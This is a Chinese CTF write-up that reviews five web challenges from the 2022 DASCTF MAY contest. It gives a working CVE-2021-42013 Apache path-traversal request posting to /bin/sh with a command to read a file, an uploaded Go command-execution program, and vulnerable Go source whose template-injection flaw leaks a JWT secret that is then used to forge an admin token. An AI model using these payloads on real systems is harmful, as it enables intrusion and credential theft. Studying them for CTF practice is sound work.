---
title: 2022DASCTF MAY 出题人挑战赛
date: 2022-05-22 18:04:48
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

**2022DASCTF MAY 出题人挑战赛**,比赛的时候忘记了，赛后复盘一下web题目

<!--more-->

# Power Cookie

![](https://z4a.net/images/2022/05/22/imagec68c8f1f7be1947f.png)

bp抓包看一下![](https://z4a.net/images/2022/05/22/image2959211a0ed6dd7b.png)

加个cookie: admin=1，得到flag![](https://z4a.net/images/2022/05/22/imageab52b08dd3c450c7.png)

DASCTF{ad221339-14b2-4a5e-9d23-e2a0aaefbb2c}

# 魔法浏览器

[![image6d1e169fcfa2b3aa.png](https://z4a.net/images/2022/05/22/image6d1e169fcfa2b3aa.png)](https://z4a.net/image/2w3Jr9)

直接访问404，抓包看一下[![image42d4e74562a38469.md.png](https://z4a.net/images/2022/05/22/image42d4e74562a38469.md.png)](https://z4a.net/image/2w3c45)

```
"\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35";    console["\x6c\x6f\x67"](ua);
```

Unicode-str解码后得到

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
```

替换UA得到flag[![image1560deb399960ddc.png](https://z4a.net/images/2022/05/22/image1560deb399960ddc.png)](https://z4a.net/image/2w3i5h)

DASCTF{7b6f6dfb-4d9d-40ff-8ae5-d696c93302c3}

# getme

[CVE-2021-42013 Apache HTTPd 2.4.49 2.4.50 路径穿越以及RCE漏洞](https://www.cnblogs.com/L0ading/p/15406905.html)

抓包然后

```
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
```

```
echo;cat /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg
```

![imagee6f1a029f79e3fee.png](https://z4a.net/images/2022/05/25/imagee6f1a029f79e3fee.png)

DASCTF{6e919d79-7742-4e38-a323-6b02d2041055}

# hackme

![image58d6aa7fd8a441e3.png](https://z4a.net/images/2022/05/31/image58d6aa7fd8a441e3.png)

一些go文件，点了会有回显，可以上传go文件，写一个命令执行

```
package main

import (
	"fmt"
	"os/exec"
)
func reverseshell() {
	out, _ := exec.Command("cat", "/flag").Output()
	output := string(out[:])
	fmt.Println(output)
}
func main() {
	reverseshell()
}
```

然后上传，访问usres，得到flag

![image57124835ffcfae0d.png](https://z4a.net/images/2022/05/31/image57124835ffcfae0d.png)

```
DASCTF{b5ce4552-3855-4243-81c4-3f4a14b8f18f}
```

# fxxkgo

这道题是基于go语言的

代码审计

ssti

jwt伪造

题目源码如下

```
package main

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt"
	"os"
	"text/template"
)

type Account struct {
	id         string
	pw         string
	is_admin   bool
	secret_key string
}

type AccountClaims struct {
	Id       string `json:"id"`
	Is_admin bool   `json:"is_admin"`
	jwt.StandardClaims
}

type Resp struct {
	Status bool   `json:"status"`
	Msg    string `json:"msg"`
}

type TokenResp struct {
	Status bool   `json:"status"`
	Token  string `json:"token"`
}

var acc []Account
var secret_key = os.Getenv("KEY")
var flag = os.Getenv("FLAG")
var admin_id = os.Getenv("ADMIN_ID")
var admin_pw = os.Getenv("ADMIN_PW")

func get_account(uid string) Account {
	for i := range acc {
		if acc[i].id == uid {
			return acc[i]
		}
	}
	return Account{}
}
func clear_account() {
	acc = acc[:1]
}

func jwt_encode(id string, is_admin bool) (string, error) {
	claims := AccountClaims{
		id, is_admin, jwt.StandardClaims{},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret_key))
}

func jwt_decode(s string) (string, bool) {
	token, err := jwt.ParseWithClaims(s, &AccountClaims{}, func(token *jwt.Token) (interface{}, error) {
		return []byte(secret_key), nil
	})
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	if claims, ok := token.Claims.(*AccountClaims); ok && token.Valid {
		return claims.Id, claims.Is_admin
	}
	return "", false
}


func rootHandler(c *gin.Context) {
	token := c.GetHeader("X-Token")
	if token != "" {
		id, _ := jwt_decode(token)
		acc := get_account(id)
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		if err != nil {
		}
		tpl.Execute(c.Writer, &acc)
		return
	} else {

		return
	}
}

func flagHandler(c *gin.Context) {
	token := c.GetHeader("X-Token")
	if token != "" {
		id, is_admin := jwt_decode(token)
		if is_admin == true {
			p := Resp{true, "Hi " + id + ", flag is " + flag}
			res, err := json.Marshal(p)
			if err != nil {
			}
			c.JSON(200, string(res))
			return
		} else {
			c.JSON(403, gin.H{
				"code": 403,
				"status": "error",
			})
			return
		}
	}
}

func authHandler(c *gin.Context) {
	uid := c.PostForm("id")
	upw := c.PostForm("pw")
	if uid == "" || upw == "" {
		return
	}
	if len(acc) > 1024 {
		clear_account()
	}
	user_acc := get_account(uid)
	if user_acc.id != "" && user_acc.pw == upw {
		token, err := jwt_encode(user_acc.id, user_acc.is_admin)
		if err != nil {
			return
		}
		p := TokenResp{true, token}
		res, err := json.Marshal(p)
		if err != nil {
		}
		c.JSON(200, string(res))
		return
	}
	c.JSON(403, gin.H{
		"code": 403,
		"status": "error",
	})
	return
}


func Resist(c *gin.Context){
	uid := c.PostForm("id")
	upw := c.PostForm("pw")
	if uid == "" || upw == "" {
		return
	}
	if get_account(uid).id != "" {
		c.JSON(403, gin.H{
			"code": 403,
			"status": "error",
		})
		return
	}
	if len(acc) > 4 {
		clear_account()
	}
	new_acc := Account{uid, upw, false, secret_key}
	acc = append(acc, new_acc)

	p := Resp{true, ""}
	res, err := json.Marshal(p)
	if err != nil {
	}
	c.JSON(200, string(res))
	return
}
func index(c *gin.Context) {
	c.JSON(200,gin.H{
		"msg": "Hello World",
	})
}

func main()  {
	admin := Account{admin_id, admin_pw, true, secret_key}
	acc = append(acc, admin)
	r := gin.Default()
	r.GET("/",index)
	r.POST("/", rootHandler)
	r.POST("/flag", flagHandler)
	r.POST("/auth", authHandler)
	r.POST("/register", Resist)
	r.Run(":80")

}
```

通过看main函数得知存在五个路由![imagedc5bc897b554f7e5.png](https://z4a.net/images/2022/05/31/imagedc5bc897b554f7e5.png)

总的来说就是五个路由都走一遍就可以得到flag，这里系统分析一下这几个路由的作用，也算学习一下了

```
func index(c *gin.Context) {
	c.JSON(200,gin.H{
		"msg": "Hello World",
	})
}
这个是get请求的根目录
```

```
func rootHandler(c *gin.Context) {
	token := c.GetHeader("X-Token")
	if token != "" {
		id, _ := jwt_decode(token)
		acc := get_account(id)
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		if err != nil {
		}
		tpl.Execute(c.Writer, &acc)
		return
	} else {

		return
	}
}
这个是post请求实现的功能
```

```
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		而这句话存在ssti漏洞
```

剩下几个路由看看就行了，毕竟已经找到了漏洞，

​	根据分析**register**是用来创建用户**id**和**pw**的，存入已经定义好的结构体中

```Go
type Account struct {
	id         string
	pw         string
	is_admin   bool
	secret_key string
}
```

所以首先先注册一下![image7496d9bbea766e2e.png](https://z4a.net/images/2022/05/31/image7496d9bbea766e2e.png)

这个时候再用auth查看下路由，可以看到得到了一个jwt![imageb2794d98b33c4845.png](https://z4a.net/images/2022/05/31/imageb2794d98b33c4845.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imh1YW5nIiwiaXNfYWRtaW4iOmZhbHNlfQ.1pxpRWSXDJi2wGLiYJVUT4WqVYZfDX8iIFyauR4qVnM
```

现在需要做的就是搞到密钥将jwt换上![imagea404a9e032351599.png](https://z4a.net/images/2022/05/31/imagea404a9e032351599.png)

可以看到我注册的账号，利用这个账号进行ssti注入，利用**{ {.}}**即查看所有内容，最后可以查到密匙

再注册一个号

![imagea420e9ed460b4050.png](https://z4a.net/images/2022/05/31/imagea420e9ed460b4050.png)

一样的思路步骤![image87b8ab679bf1c466.png](https://z4a.net/images/2022/05/31/image87b8ab679bf1c466.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.1c8I_PzGiyonSZe3UPM2AB94x07g6DeyJW6uYA2C7eo
```

![image0cd0c392d6c0e4e6.png](https://z4a.net/images/2022/05/31/image0cd0c392d6c0e4e6.png)

```
fasdf972u1041xu90zm10Av
```

然后jwt身份伪造

![image4c109e46d4b14a35.png](https://z4a.net/images/2022/05/31/image4c109e46d4b14a35.png)

将伪造的jwt写进去，得到flag
